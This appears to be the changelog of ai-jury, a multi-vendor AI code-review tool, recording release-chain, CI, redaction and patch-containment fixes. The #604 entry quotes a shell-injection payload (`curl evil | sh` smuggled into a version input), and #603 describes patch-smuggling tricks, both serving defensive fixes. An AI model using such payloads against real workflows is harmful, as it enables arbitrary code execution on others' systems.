- **The Homebrew release chain, written down** (#646): `docs/homebrew-release-chain.md`. Between 25 and 27 August this chain failed four separate ways and each was diagnosed from scratch, because nothing recorded how the pieces fit.
  - Covers the contradiction the whole design is arranged around (the formula's url and digest cannot both be correct at once), every guard and where it lives, what has already gone wrong and what each fix added, the two settings that still require a manual step, and a symptom-to-cause table for the next failure.
  - Linked from the README and from the release checklist, which is the *what* to this document's *why*.
- **The Keel Cookbook Recipe Configured A Key Keel Doesn't Have** (#664): `docs/cookbook.md` §16 told readers to add `review: { engine: ai-jury, preset: balanced, gating: true }` to `.keel/project.yaml`. Keel's schema has no top-level `review` key — `keel validate` rejects it with `unknown property 'review'` — so the recipe could never actually pass validation.
  - Rewritten around the real integration: the built-in `jury` gate (`gates: [build, lint, jury]`), `knobs.jury_timeout_s`, the `keel ship --jury` / `--jury-advisory` / `--no-jury` flags and their precedence, the ai-jury-severity-to-keel-severity mapping, and how the `keel.jury-verdict.v1` PR comment and the `.keel/state/jury/<run-id>.json` report feed `keel evidence-verify --jury-vendors` and `keel-visual`. Links out to keel's own `docs/keel/configuration.md` and `docs/keel/evidence.md` rather than restating them.
  - Notes that per-panelist ballots (`--format keel-reviews`, #663) and a `jury run-agent` recipe (#661) aren't wired into Keel yet, so the recipe doesn't imply they are.
  - Pinned by `tests/test_docs_snippets.py`: every `.keel/project.yaml`-marked snippet in the cookbook is parsed and its top-level keys are checked against a vendored allowlist of keel's actual schema keys, so a `review:`-shaped regression fails the suite instead of waiting for the next reader's `keel validate`.
- **Rollback For A Bad Tap Write Or A Partial Publish Was Undocumented** (#667): `docs/release-checklist.md` covered only a bad PyPI release and a bad tag/GitHub Release — nothing for a wrong `Formula/ai-jury.rb`/tap write, and nothing for "PyPI succeeded, GitHub Release failed" (`skip-existing` only makes the PyPI step idempotent, not the workflow).
  - Rollback is now a decision table with exact `gh`/`git`/`brew` commands per situation, phrased around whether the tap was actually written rather than a step number, so it stays accurate whether the tap gets a direct write or a scheduled pull.
  - `docs/releasing.md` now links [`docs/homebrew-release-chain.md`](docs/homebrew-release-chain.md) from the Homebrew distribution-channel paragraph instead of describing the sync as one automatic pass, and drops the "v1.0.0 and v1.1.0 were published this way" example, stale 14 releases later.
  - The rollback rows themselves are unrehearsed — no scratch-tag transcript exists yet; tracked as a follow-up rather than claimed as verified.

## [1.15.1] - 2026-08-27

### Fixed
- **The Release Gate Blocked The Only Sequence That Could Satisfy It** (#638): the formula must name the version in `pyproject.toml` — an offline test demands it — and that version's sdist does not exist until the tag is pushed, so between the release pull request and the tag the formula's url legitimately 404s.
  - The external check turned that 404 into a failure, which made every release pull request unmergeable from the moment the check was wired into CI earlier the same day. It is also what left #637 sitting blocked for hours, looking like a broken security fix while the real cause was a version bump riding along in the same commit.
  - A 404 is now read against PyPI: if the version is not published yet the formula is ahead of it by design and the check skips, saying so. Once the version *is* published a 404 means the url names an artifact that should exist and does not — #562 — and that still fails.
  - The decision is a plain function taking a lookup, so both readings are exercised offline with a stub instead of by choosing a moment in the release cycle to run the suite. Four mutations — inverting it, pinning it true, pinning it false, and asking about the wrong version — each fail.
  - The sibling repository hit the identical bind and resolved it the same way (its #839); this follows that precedent rather than inventing a second answer.
- **git stderr Reached An Exception Unredacted** (#631): `_git_diff` had two adjacent error paths and only one redacted — the spawn failure did, the non-zero exit did not.
  - `redact()` does catch what this is aimed at: a token in a remote URL becomes `[REDACTED:github_token]`. Verified, not assumed.
  - **Raised as `[CRITICAL]`, recorded as `[LOW]`.** Only `git show` and `git diff` reach that path and both are purely local — they cannot print a URL carrying a credential; their real stderr is `fatal: ambiguous argument`. No path was demonstrated by which a secret arrives. #600/#608 is the precedent for why an overstated sentinel entry is expensive.
  - Guarded rather than left as a one-liner: a token must not survive, an ordinary `ambiguous argument` must still reach the operator **unmangled** — over-redaction is how this class of fix usually breaks — and only the first stderr line is quoted. Reverting the `redact(...)` call fails the first.
  - Reapplied from current `main`: the original branch had drifted to where its diff removed 261 lines of the day's work, including the `agy` fix.
- **The Formula Fix Could Not Reach `main`, So It Was Never Applied** (#638): the follow-up to #633 hardened the swallowed push into a loud `::error::`, which makes the failure visible but still leaves the repair to whoever reads the release log.
  - `publish.yml` now pushes the digest to a branch and opens a pull request for it — the only write to a protected `main` that can succeed. The error path remains for the case where even that push fails.
  - `tests/test_publish_formula_followup.py` pins it: no `HEAD:main`, a pull request is opened, and the job carries `pull-requests: write`. The assertions run over the step's code with comment lines removed, since the workflow's own comments describe the direct push it no longer performs.
  - The commit heading that pull request no longer carries `[skip ci]`. It was correct while the commit went straight to `main` — a formula bump needs no re-run — and fatal on a pull request, where it suppresses every workflow so the ten required checks never report and the PR can never merge. Pinned by a test; the token is invisible at the end of a long commit-message line.
  - The sibling repository takes the same route now, after failing the same week from the opposite direction: it emitted a notice with the correct digest and nobody acted on it.
- **`agy` Contributed Nothing To Any Panel** (#635): `AgyAdapter` built `agy --print` and wrote the prompt to stdin — verified against agy 1.0.6, and broken on 1.1.x where `--print` takes a value.
  - With an empty `extra_args` the run died on `flag needs an argument: -print`; with a non-empty one agy consumed the first flag as the prompt. Either way the agent passed every availability check and returned nothing, so a three-vendor panel silently became two — or one.
  - **`--doctor` could not see it.** The probe establishes that the binary exists and answers `--version`; the failure is in the argv the adapter builds, which the probe never exercises.
  - The obvious repair — put the prompt in argv — would have silently reverted #287, which moved it to stdin so the redacted diff is not readable in `ps` by any local user. That decision was recorded with an issue number in the adapter's own comment, and undoing it there would have been the worst place to do it.
  - The prompt moves to agy's own stdin channel instead: `--input-format stream-json` reads one NDJSON message per line and requires `--output-format stream-json`. `--print` is not passed at all — the input format implies print mode, and passing it would reintroduce the arity problem.
  - Verified end to end against agy **1.1.22**, not against the issue's description: the argv, the frame shape (a message without `event` is rejected outright), and the parse of the `result` event. A live run now returns `ok=True`.
  - A stream with no `result` frame falls back to the raw text rather than returning empty. An empty review is counted as an abstention, and #625 exists because an abstention read as an approval is the expensive failure.
  - Mutation-tested four ways: restoring `--print`, moving the prompt to argv, sending the bare prompt on stdin, and allowing an empty response each fail.
- **The Homebrew Tap Refused Every Sync Since 1.15.0** (#633): the formula carried 1.14.4's digest under a 1.15.0 url, so the tap guard refused to publish and `brew upgrade` could not see the release. The scheduled retry failed roughly every 30 minutes — in a different repository, hours after the release.
  - `publish.yml` computed the digest correctly, committed it, and pushed with `git push origin HEAD:main || true`. Branch protection had been added the same day (#620), so the push was rejected and the `|| true` reported success.
  - The next step's fallback — *"the tap will pick this up on its own schedule"* — is sound only if the in-repo formula is right, which the swallowed push had just failed to make it. Two silent degradations, one hard failure.
  - **The guard already existed and had never run.** `tests/test_homebrew_formula.py` has asserted the url-to-digest match all along, gated on `AI_JURY_CHECK_EXTERNAL` — a variable set nowhere in CI. The sibling repo is the mirror image: a network-enabled job and no formula test. Each had half.
  - The push now emits a loud `::error::` naming the follow-up instead of swallowing. Deliberately not a non-zero exit: PyPI and the GitHub Release have already succeeded by that point, and failing there would report a good release as broken. The hard stop is CI.
  - The formula tests run in `Action pins match upstream`, which already has network and is already a required check. That job **keeps its name**: renaming it would leave a required context that never reports, blocking every merge permanently.
  - Mutation-tested against the real mistake: restoring 1.14.4's digest fails 2 tests, pointing at a nonexistent version fails 3.

## [1.15.0] - 2026-08-25

### Added
- **`--min-vendors`: fail when the panel collapsed** (#625). `--strict` fails when a configured agent CLI is *missing*; it does not fail when one is present, probes clean, and then returns nothing — which is how a three-vendor panel silently becomes one.
  - Observed on a real run: `effective panel: 1 of 3 reviewer(s)` — `claude` failed on an expired session, `agy`'s launcher ate the prompt, `codex` reviewed alone. `jury --doctor` had reported all three `[available]` with `probe: ok` beforehand and was right; they were installed. The run still exited 0 and emitted a verdict.
  - Cross-vendor consensus is the premise, so a single-vendor run is a different thing wearing the same output — and the difference was only visible to someone who scrolled to Run metadata.
  - Counts **distinct vendors that contributed a review**, not slots: three agents from one vendor are one perspective, and an abstention is not one at all. `panel_accounting` already computed this; nothing consumed it as a gate.
  - **Opt-in (default 0), and the default is deliberately not decided.** Failing closed on a flaky vendor CLI turns a degraded second opinion into no second opinion; that trade belongs to whoever runs the panel.
  - Exits **3**, distinct from `evaluate_ci`'s 0/1, so a caller can tell "the reviewers disagreed with you" from "the reviewers never ran".
  - Tested on agents that are configured and available but return nothing — never a missing CLI, which is the case `--strict` already covers and which would pass whatever this change does. Four mutations fail: defaulting it on, dropping the flag guard, reusing exit 1, and counting reviews instead of vendors.

- **The Review-Evidence Chain Is Wired Up** (#602): of the 16 PRs merged into `main` between 2026-08-19 and 2026-08-24, none carried a review verdict — including changes to the modules `tier3_globs` already lists as highest-risk.
  - The cause was **not** the `gates: [build, lint]` line the issue pointed at: keel's own `projects/keel.yaml` declares exactly the same two. The gate is driven by a workflow, and this repo had none. Confirmed by running `keel evidence-verify` against a real PR here before writing anything — it works against the existing config unmodified, deriving a tier-2 two-reviewer requirement from `tier3_globs`.
  - `.github/workflows/keel-ship.yml` is the consumer copy of keel's own, running `keel evidence-verify --phase pre-merge --require-armed` and publishing the verdict as the `keel evidence (required)` check-run.
  - keel is installed **pinned**, and from `keel-workflow`. The PyPI name `keel` is an unrelated package at version 0.1; installing it would have given the job someone else's code and a failure that reads like a keel bug. A test asserts the package name as a rule over every install line — `keel-workflow` legitimately contains `keel`, so asserting the absence of a string would not have worked.
  - **No jury requirement**, per the issue's recommendation. keel auto-enables a *gating* jury verdict at tier-3, and this repo's jury runs against real vendor APIs; a paid run per PR is not the cost posture, and a gate nobody can afford to satisfy is one that gets waived. It drops only that verdict — tier-3 still requires three distinct reviewer verdicts. A test pins the disarm as narrow: no `--reviewers` override, no `--jury-advisory`, no blanket deferral, no `--dry-run`.
  - The gate reports but does not yet block: making the check *required* is a branch-protection change, which is an operator action. `.keel/project.yaml` now says so next to `gates:`, so the next reader does not re-derive this issue from an unexplained two-item list.
  - **Two of the first mutations against the new tests passed, and that is why the tests changed shape.** Every flag asserted on is also *described* in a comment a few lines above it, so `assertIn("--require-armed", body)` held with the flag deleted; and `assertIn("issue_comment:", body)` matched `_disabled_issue_comment:`. The assertions are now line-anchored over comment-stripped text, with a guard asserting the stripping actually strips. Seven mutations — dropping `--require-armed`, `--phase`, the trigger, the gate call, the version pin, the package name, and colliding the job name with the check name — each fail.

### Changed
- **`ruff-format` Rewrote 38 Files Under Anyone Who Installed The Hooks** (#621): `.pre-commit-config.yaml` declared `ruff-format` as a **rewriting** hook, pinned to `v0.4.4`, on a tree 35 files from formatted.
  - A contributor who installed the hooks and committed a one-line change got 38 unrelated files rewritten into it — silently, already staged by the time they looked. CI never noticed: it ran **no ruff step at all**, neither lint nor format.
  - The pin made it worse than plain drift. `v0.4.4` and current `0.16.3` format *differently* — different `ruff format --diff` output, and they disagree on five files about whether those are already formatted. The hook and any modern ruff actively undid each other.
  - Hook bumped to `0.16.3`, tree formatted, and a `Lint + format (ruff)` job added to CI so it stays true.
  - **CI's ruff is pinned to the same version as the hook**, and `tests/test_ruff_pin.py` asserts they match. The dev extra is `ruff>=0.6`, which is right for linting — new rules are worth picking up — but a format gate on a floating formatter goes red the day ruff changes its style, for reasons unrelated to the change under review.
  - **Verified at the syntax-tree level, not by the suite passing.** All 36 changed Python files parse to byte-identical trees before and after: zero semantic differences. At this size "the tests passed" is weak evidence, since most of these files have no test that would notice a changed string.
  - Mutation-tested: drifting the hook version, dropping CI's pin, and removing either ruff step each fail.

- **#600 Withdrawn: The `workspace-write` Sandbox Bypass Never Existed** (#608): shipped as `[HIGH]` security, reclassified as a docs/wording change.
  - The claim was that `_DANGEROUS_FLAGS` omitting `workspace-write` let a Codex reviewer configured with `-s workspace-write` escape all warnings and `--strict`. Measured at the fix commit and its parent, that spec produces **exactly one warning either way** — only the wording differs. `audit_agent` warns for any non-claude agent not under a *restricting* sandbox, and that catch-all had been in the file since `f5797cf` (2026-06-07), two and a half months earlier. `--strict` promotes any warning to a failure, so the configuration already failed. There was nothing to escape.
  - What #600 actually did was replace a generic "no recognized sandbox" message with one naming `workspace-write` and the powers it grants — worth doing, and not a security fix. The release history never carried the `[HIGH]`: #600 touched no changelog. The only record was `.jules/sentinel.md`, which is where the correction goes.
  - The shared error was one disjunction: all four passes read `audit_agent` as exonerating an agent when *either* it is sandboxed *or* no dangerous flag matches. Only the first is an exit; the flag list selects the message, not the verdict. **The refutation was a green test in the file they were reviewing** — `test_codex_no_sandbox_no_dangerous_flag_warns`, added alongside the catch-all. It said `assertTrue(...)`, too quiet to be read as a refutation; it now names the catch-all message, with a companion asserting that an unlisted wide sandbox warns for the same reason.
  - `docs/live-review-report.md` is annotated at all three assertions rather than edited: how four independent passes converged on the same wrong reading is the part worth keeping.

### Fixed
- **Duplicate Changelog Sections Shipped Into The Release Notes** (#627): `## [Unreleased]` carried `### Added` and `### Changed` twice each, and `## [1.0.0]` repeats `Changed` and `Fixed` in released history.
  - Nothing was lost — each entry was inserted above the previous top section, so the document grew alternating headings. `## [Unreleased]` becomes `## [x.y.z]` verbatim at release, so the duplication would have shipped to PyPI's description and the GitHub Release notes, where a reader looking for "what changed" finds two lists of the same kind.
  - Consolidated across every version block. The entry count is identical before and after (216 lines beginning `- `), which is the check that separates a merge from a deletion.
  - `tests/test_changelog_sections.py` asserts no version repeats a section, that headings come from a known vocabulary — `### Fixes` is silently a different bucket from `### Fixed` — and that `Unreleased` is non-empty, since a release cut from an empty block is blank.
  - The vocabulary is a fixed list, not one derived from the file, which would pass by construction. It covers Keep a Changelog's six plus the three this project uses (`Documentation`, `Performance`, `Internal`); the first draft omitted those and would have imposed a vocabulary the project never adopted.
  - Mutation-tested: repeating a section, misspelling `Fixed` as `Fixes`, and emptying `Unreleased` each fail.
- **A ReDoS Test That Measured Machine Load** (#614): `test_no_redos_on_long_key_like_input` asserted a 3-second wall-clock ceiling on one input size. It failed whenever the suite ran under `coverage` — which is how CI and the pre-push check run it — for reasons unrelated to the code.
  - The number it asserted on was dominated by scheduler noise, not input size: measured on a loaded machine, 200 000 characters came out *faster* than 50 000. A non-monotonic series is not measuring the thing it names.
  - It also could not catch what it claimed to. A ceiling on a single size cannot distinguish quadratic from linear-but-slow; a blowup appearing below the tested size would have passed.
  - Replaced by an assertion on the **growth ratio** across a doubling, which is what "not quadratic" actually means. `process_time` measures this process's CPU only, so load elsewhere cannot inflate it, and `min` over repeats is the right estimator for a timed body — noise only ever adds.
  - Verified in both directions, which the old test never was: it passes under `coverage` with eight CPUs deliberately saturated, and reverting the `{0,40}` bound to `*` fails it at 4.04x with a message naming the cause. Linear measures 1.7–2.2x, identical under `coverage`; the 3.0 threshold has room on both sides.
  - Sizes grow automatically until the base measurement clears the clock's real step, so a faster machine raises the input instead of going flaky. The floor is **measured, not assumed**: `get_clock_info().resolution` advertises the API's precision, and on Windows reports 1e-7 while `process_time` actually advances in 15.625 ms steps.
  - That distinction was not theoretical — the first cut of this fix used a fixed 0.005 s floor, below one Windows tick, and CI read 0.0156s → 0.0469s (one tick against three) as 3.00x quadratic growth. Reproduced locally by quantising the clock and sweeping machine speed: the fixed floor fails at 1.7x with CI's exact message and divides by a zero-quantised base at 0.5x, while the measured floor passes across 0.5x–3.0x.
  - The correctness half — a long key-like input is not an assignment — is now its own test, unaffected by timing.
- **Conflict Markers Published In The Changelog** (#615):
  - Three unresolved git conflict markers sat in `CHANGELOG.md` on `main` from #601 (2026-08-24) until now, rendered in the published changelog. No content was lost — the #606 and #607 entries were both present and correctly placed; the three lines were residue from a resolution that kept both sides and never removed the scaffolding.
  - The markers are the symptom. The defect is that nothing asserted their absence, so every CI run in between was green on a file containing `>>>>>>>`.
  - `tests/test_no_conflict_markers.py` scans the tracked set from `git ls-files` — not a hand-listed glob, so a new file type is covered the day it lands. It refuses all three markers, `=======` included: dropping the separator would let a resolution that leaves only *it* behind pass, which is the same half-finished merge.
  - Exactly seven characters, alone or followed by a space, so an eight-bracket quoted reply and an indented line are not matches — all three asserted.
  - The scan carries a vacuity floor and pins `CHANGELOG.md` as tracked: a scan that reads nothing otherwise passes for the wrong reason. Verified against the real residue, which it reports by file and line number.
- **`jury init` Offered Seven of Eleven Agents** (#606):
  - `KNOWN_AGENTS` is derived from `agent_templates()` instead of hand-listed. Four templates — `openrouter`, `deepseek`, `groq`, `aider` — shipped without ever reaching the tuple, so `--list-agents`, the wizard and `--preset all` could not see them while the unknown-agent error message named them. The CLI told users to choose from four options it never offered. #589 asked for exactly this and #590 rewrote the error message instead.
  - Adding them naively broke `jury init --preset thorough` outright: three point at real vendor hosts, and the config validator refuses a non-loopback endpoint without `JURY_ALLOW_REMOTE_ENDPOINT`, so the generated config was rejected before it could be written. They are now listed and selectable by name always, and included in an "all" preset only once the opt-in is present.
  - Both distinctions are derived from the templates rather than listed, so a new hosted template is covered the day it lands — a second hand-maintained roster is the defect this issue is about.
- **Three Error Branches Nothing Executed** (#607):
  - `patches.py`'s `Cannot read` / `Cannot write` arms and `cli.py`'s report-read arm were added by #588 and covered by no test — nothing in the repository referenced any of the three messages, and the 98% coverage floor had room for three uncovered branches.
  - #588's body said "Added regression tests in `test_cli_contract.py` and `test_patches_apply.py`". Literally true — one test in each — but between them they covered two of five new branches, and the one placed in `test_patches_apply.py` exercised `cli.py`'s `_run_apply` rather than `patches.py`, so the filename made the untested bullet above it look guarded.
  - Each branch now has a case built from a real failure shape (undecodable bytes, a read-only file), plus one asserting a refused apply leaves the file byte-identical.

### Security
- **Shell Injection via `inputs.version`** (#604):
  - `action.yml`'s install step interpolated `${{ inputs.version }}` directly into its `run:` body. A GitHub expression is substituted textually before bash parses the line, so a caller passing `version: '1.0"; curl evil | sh; "'` executes arbitrary shell in the action's step. #584 moved `args`, the PR number and the base ref into `env:` for exactly this reason and left this one behind — the sweep it described in the plural was done in the singular.
  - Now passed as `INPUT_VERSION` through `env:` like every other caller-supplied input.
  - The guard is a rule over every step, not an assertion about one line: no `run:` body may contain a `${{ }}` expression, with a vacuity check so it cannot pass when there are no run bodies left, and a positive counterpart asserting each input still reaches the script through `env:`.

- **`jury apply` Previews And Confirms Before It Writes** (#605): a destructive command no longer writes unannounced.
  - `--dry-run` prints the paths each suggestion would touch and writes nothing.
  - The preview is printed **before** any write, and comes from the same `git apply --check` probe the containment check uses — so it cannot disagree with what an apply would do, and it names a path the suggestion itself never claims (a rename target). Previously the per-suggestion output appeared *after* the write had happened.
  - Applying now requires confirmation, or `--yes` for scripted use. When stdin is not a terminal and `--yes` was not passed, the command refuses rather than assuming consent — piping a report in is exactly the unattended case, and stdin may already be consumed by the report itself.
  - The `index` argument no longer defaults to `all`. A bare `jury apply --report r.md` rewrote the working tree with every suggestion in the report; it now names the range and points at `--dry-run`.
  - Independent of #603: any hand-rolled containment check is a bet that every way a patch can name a file was enumerated. This is what makes losing that bet survivable rather than silent.
  - Found while building the preview: `parse_patch_suggestions` strips the fenced block's trailing newline, and git rejects a patch body whose last line is a header rather than content. A suggestion carrying a rename or mode section could not be read at all — the preview reported "nothing git could read" for a patch that was merely missing its terminator. The body is newline-terminated for both the probe and the apply, which are now guaranteed to see identical input.
  - Every new test asserts against `git status --porcelain`, not just the exit code: the defect being fixed is precisely a command that reported one thing and wrote another.
- **Patch Containment Now Asks Git Instead Of Reading Headers** (#603): `apply_patch_suggestion` derives the set of paths a patch would touch from `git apply --numstat -z --summary --check`, and refuses unless it is exactly the suggested file.
  - The check added by #584 inspected only `--- `/`+++ ` header lines. Git carries filenames in several other constructs and honours all of them — `rename from`/`rename to`, `copy from`/`copy to`, `old mode`/`new mode`, and a `GIT binary patch` section that has no `---`/`+++` lines at all. A patch whose headers named the suggested file could rename an unrelated path and still return "Applied git patch to <file>". Reproduced against a throwaway repository.
  - It failed because it was a **blocklist**: enumerate the dangerous header forms and reject them. Adding `rename from` to the same loop repeats the design and misses the next construct. Validation and application now go through the same parser, which closes the gap rather than narrowing it.
  - `--numstat` reports a rename's destination but never its source, so a patch can remove a path no numstat record mentions. `rename` and `copy` are therefore refused as operations — a single-file suggestion has no business doing either — rather than having their paths re-derived from `--summary` prose. This is not belt-and-braces: a patch that deletes the target and then renames another file onto it is accepted by git, and numstat reports *only* the suggested file, twice. The path set matches exactly and the `--summary` line is the sole evidence the other file was destroyed.
  - **Found while fixing this, one step earlier:** the diff detection was `startswith("---") or "@@" in fix`. A rename-only or binary-only body has neither, so it never reached the git branch at all — it fell through to the line-replacement path, which wrote the diff *text* into the target file and reported success. Anything git can read as a patch now reaches the branch where containment is decided.
  - The previous test passed for the wrong reason: the secondary target did not exist in the fixture, so `git apply` failed on its own and the assertion landed on the error string — removing the guard entirely left it green. Every new fixture creates the secondary target, so the patch would otherwise apply cleanly.
  - Reachable only via `jury apply` run locally against a report derived from an untrusted diff; `action.yml` does not invoke it.

## [1.14.4] - 2026-08-19

### Fixed
- **Graceful Error Handling for Missing / Unreadable Input Files** (#587, #588): Handled `FileNotFoundError`, `IsADirectoryError`, `OSError`, and `UnicodeDecodeError` in `jury --diff-file <path>` and `jury apply --report <path>` gracefully with clean exit codes and error messages instead of raw Python tracebacks.
- **Universal Provider Template Suggestions in Config Scaffold** (#589, #590): Updated `build_config` in `src/ai_jury/scaffold.py` to list all supported universal provider templates (`openrouter`, `deepseek`, `groq`, `aider`) when an invalid agent name is provided.

## [1.14.3] - 2026-08-19

### Security
- **Patch Smuggling & Path Traversal Containment in `jury apply`** (#584): Strictly validate unified diff header paths (`--- a/...`, `+++ b/...`) against directory traversal and ensure they cannot target files outside the verified finding's targeted file.
- **GitHub Action Shell Injection Hardening** (#584): Safely pass `inputs.args` and PR metadata through environment variable indirection (`$INPUT_ARGS`) instead of inline template substitution in `action.yml`.

### Fixed
- **GenericCLIAdapter Crash on Missing CLI Executable** (#584): Fixed `AttributeError` by replacing non-existent `AgentResult.failed()` with proper `AgentResult` instantiation carrying `ERR_MISSING_CLI`.

## [1.14.2] - 2026-08-19

### Performance
- **Single-Pass Panel Accounting & Aggregations** (#574, #580): Consolidated sequential list comprehensions and `.count()` calls in `panel_accounting()` and `consensus` into explicit single-pass O(N) loops, eliminating redundant list iterations and interpreter overhead.

### Fixed
- **Homebrew Formula Dynamic PyPI Sync & Verification** (#563, #564): Resolved formula 404 and checksum mismatch by fetching PyPI's content-addressed sdist URL and SHA-256 digest at publish time. Pushed live formula to `berkayturanci/homebrew-ai-jury` tap and added unit tests (`tests/test_homebrew_formula.py`).
- **GitHub Action Marketplace Branding** (#579): Fixed action branding color in `action.yml` to conform to GitHub Marketplace color palette.
- **Website & Documentation Infrastructure** (#566, #567, #572, #573, #576, #578): Migrated canonical domain to `ai-jury.dev`, published `install.sh` to prevent 404s, added IndexNow search engine notification automation, and added native tooltips for modal close buttons.
- **CI Silent-Revert Guard Restoration** (#561): Restored release monotonicity validation job in CI.

## [1.14.1] - 2026-08-17

### Security
- **Git Apply Stderr Secret Redaction** (#555): Enforce `redact()` filtering on `git apply` standard error before surfacing patch failure diagnostics to users, preventing potential credential leakage.

### Fixed
- **CI Silent-Revert Guard Validation** (#553, #557): Run `scripts/verify_merge.py` in a dedicated CI job with `fetch-depth: 0` to accurately evaluate semver tag monotonicity and prevent stale branches from silently reverting releases.
- **Website Accessibility & Focus Indicators** (#552, #554): Added explicit `:focus-visible` styling for interactive `.int-card` elements and converted filter buttons to semantic toggle groups with `aria-pressed` state.
- **Workflow Action Pin Annotations** (#551): Corrected GitHub Action SHA comment descriptions and added a dedicated test suite (`tests/test_action_pins.py`) to prevent action pin drift.

## [1.14.0] - 2026-08-16

### Added
- **`jury apply` Command** (#521, #534, #536): Interactive patch applier that allows developers to review and safely apply verified suggested fixes generated by `--suggest-patches`. Includes path traversal containment (`_resolve_safe_path`) and dry-run safety validation.
- **Static Analysis Hint Injection (`--hints`)** (#523, #534): Automatically runs local linter / static analysis tools (ruff, eslint, flake8) and injects diagnostic hints into reviewer agent prompts to guide deliberation towards subtle defects.
- **Tiered Model Routing (`--tiered`)** (#524, #534): Cost-aware model tiering that routes small, low-risk diffs to faster/cheaper models while reserving high-capability frontier models for complex or security-sensitive diffs.
- **Semantic Diff Chunking** (#522, #534): Chunks large multi-file diffs along logical AST/function/class boundaries rather than arbitrary line counts.
- **First-Party GitHub Action** (#519, #532): Zero-friction composite GitHub Action (`uses: berkayturanci/ai-jury@v1`) for automated PR reviews, sticky PR comments, and CI merge gating.
- **Native Pre-Commit Hook** (#520, #531): Official pre-commit repository definition (`.pre-commit-hooks.yaml`) to run consensus verification before git push.
- **In-Repo Homebrew Formula & Curl Installer** (#527, #530): Dedicated Homebrew formula in `Formula/ai-jury.rb` and standalone curl installation script.
- **Interactive Integrations Showcase with Authentic Brand Assets** (#526, #529, #535, #540, #542, #544, #545, #546): 22 verified native integrations categorized into AI CLIs, Hosted APIs, Local Engines, and CI/CD tools, rendered with official brand vectors and images.

### Security
- **Subprocess Exception Secret Leakage Guard** (#515): Ensure `GenericCLIAdapter` subprocess exception handling redacts any secret tokens before bubbling up errors.
- **Path Traversal & CLI Injection Barriers** (#536): Strict normalization and containment checks on patch file targets and CLI arguments.

## [1.13.0] - 2026-08-14

### Added
- **`--commit` and `--commits` input sources** (#367, #505): point the jury at one commit
  (`jury --commit abc1234`) or a range (`jury --commits origin/main..HEAD`) without
  producing a diff file first. Both resolve locally and flow through the existing
  pipeline unchanged — large-diff filtering, redaction, rounds, verify, verdict and the
  report all apply as-is. Needs a git repo; no `gh`. A revision may not begin with `-`
  (git would read it as an option, so it is refused rather than escaped), `--commit`
  uses `-m --first-parent` so a merge commit is reviewable instead of silently empty,
  and an empty resolved diff is an error rather than a verdict on nothing.
- **Abstention accounting in the panel** (#501, #504): a reviewer slot that returns no
  reviewable output is now recorded as an abstention rather than counted toward the
  panel. Run metadata carries `panel` (configured vs effective size, contributing
  vendors, abstained/failed counts) and a per-agent `review_status`; the report states a
  short panel explicitly. Metadata schema 3 → 4, additive.
- **Universal Provider Documentation & Hero Visuals** (#494, #495, #509, #510):
  - Updated high-resolution Retina diagrams for dark & light mode illustrating all 7+ universal agent providers (Claude, Codex, Antigravity, DeepSeek, Grok, Cursor CLI, Aider, Local models).
  - Added Cursor CLI and Grok API controls to interactive web demo & terminal deliberation theater.
  - Comprehensive documentation and recipes for OmniRoute & unified LLM gateways under `vendor = "openai-compatible"`.

### Security
- **Exception Context Chain Hardening** (#511, #507): Use `raise DomainError(...) from None` across config, replay, policy, command, and CLI modules to sever Python's `__cause__` exception chaining, preventing raw unredacted parsing snippets or stack traces from leaking to terminal logs.
- **Replay JSON Secret Redaction** (#503): Enforce secret redaction on JSON and file reading errors when loading replay outcomes.

### Changed
- The one-source rule is enforced from a list rather than pairwise, so the error names
  every source given instead of applying a silent precedence order.

## [1.12.0] - 2026-08-06

### Added
- **Universal Agent Provider Support** (#478, #479, #480, #481, #482, #483, #484):
  - **`GenericOpenAICompatibleAdapter`**: Hosted HTTP API reviewer for **OpenRouter**, **DeepSeek**, **Groq**, **Mistral**, **LiteLLM**, **Azure OpenAI**, etc. (`vendor = "openai-compatible"`, with custom `endpoint`, `api_key_env`, and `headers`). Supports polymorphic plain string and array message payload parsing.
  - **`GenericCLIAdapter`**: Integration for arbitrary coding-agent CLIs (`vendor = "cli"`, e.g. Aider, Goose, OpenHands) with `prompt_mode = "stdin"` or `"arg"`, automatic secret redaction (`redaction.redact`), and exit-code error classification (`classify_stderr`).
  - **Pluggable Provider Registry**: Dynamically register custom Python adapter classes via `ai_jury.adapters.register_adapter()`.
  - **Decoupled Privilege Audit**: Subprocess sandbox enforcement rules in `privilege.py` decoupled from vendor name matches, exempting no-subprocess HTTP API calls while maintaining fail-closed protection for CLI subprocesses.
  - **Doctor & Scaffold Extensions**: Dynamic PATH/endpoint probes in `doctor.py` and scaffolding templates in `scaffold.py` for `openrouter`, `deepseek`, `groq`, and `aider`.
  - **Terminal Theater & Interactive Web Demo**: Added brand color styling (`--c-deepseek`, `--c-openrouter`, `--c-groq`, `--c-aider`) to terminal deliberation theater (`theater.py`) and website interactive controls.

## [1.11.1] - 2026-07-27

### Fixed
- **`jury --doctor` no longer leaks a stack trace on malformed TOML** (#464): an invalid
  `jury.toml` surfaced the raw `TOMLDecodeError` traceback instead of the redacted
  config-error warning every other load failure produces. The decode error is now wrapped in
  `ConfigError` at the load boundary, so the doctor path reports it the same fail-soft way.
- **Native tooltips show on disabled form options** (#460): `pointer-events: none` on the
  disabled option wrapper blocked hover, so the `title` explaining *why* an option was
  disabled never appeared. Replaced with `cursor: not-allowed`, which keeps the visual
  affordance without suppressing the tooltip.
- **In-page anchors clear the fixed header** (#456): added `scroll-padding-top` so a
  deep-linked heading is not hidden behind the sticky site header.

### Changed
- **Faster diff-profile path handling** (#455): the per-path loops in `diffprofile` fold
  into a single pass, avoiding repeated scans over the changed-file list.

## [1.11.0] - 2026-07-17

### Added
- **`jury replay <outcome.json>`**: re-watch a finished run in the deliberation theater
  with no orchestration, network, or agents. Loads a serialized outcome (bare
  `outcome_to_dict` dump or a result-cache entry) and re-drives the theater with the exact
  per-phase event sequence the live run emitted. `--decision vote --mode code|issue`
  re-tallies the panel finale (the outcome doesn't record the run mode, hence `--mode`);
  off a tty it degrades to the `--live` step stream. Untrusted-input hardened: 8 MiB read
  cap, every failure is a clean `error:` + exit 2. First consumer of the serialized-outcome
  artifact. (#449)
- **Website "Load a real run"**: the site demo can now render an actual `jury --format json`
  outcome instead of only canned data — drop or pick a file and the in-browser theater plays
  the real reviewers, findings, verify results, and verdict. Fully client-side (8 MB cap,
  every field escaped, nothing uploaded); accepts the same shapes as `jury replay`. (#450)
- **Local-only finding demotion** (`jury.demote_local_only`, default off): a finding raised
  only by vendor `local` reviewers, uncorroborated by any cloud reviewer, is capped at
  `minor` so it no longer blocks the default CI gate but still shows. An auditable
